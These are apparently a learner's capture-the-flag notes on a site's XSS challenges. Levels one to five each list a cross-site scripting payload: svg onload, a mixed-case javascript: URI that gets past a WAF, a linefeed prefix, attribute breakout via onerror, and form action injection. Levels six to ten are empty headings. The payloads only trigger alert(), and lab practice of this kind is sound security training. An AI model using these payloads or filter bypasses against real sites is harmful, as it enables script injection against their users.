# XSS Challanges from https://www.zixem.altervista.org/XSS

## Level 1

```html
<svg/onload=alert()>
```
## Level 2

- WAF looking for "script"

```html
<object data="javascRipt:alert()">
```

## Level 3

- %0A (LF = linefeed)

```html
%0A<svg/onload=alert()>
```

## Level 4

- Inline html

```html
x' onerror=javascript:alert()//
```

## Level 5

- param reflected in form post field (action)

```html
XSS&action=javascript:alert(1337)
``

## Level 6

## Level 7

## Level 8

## Level 9

## Level 10
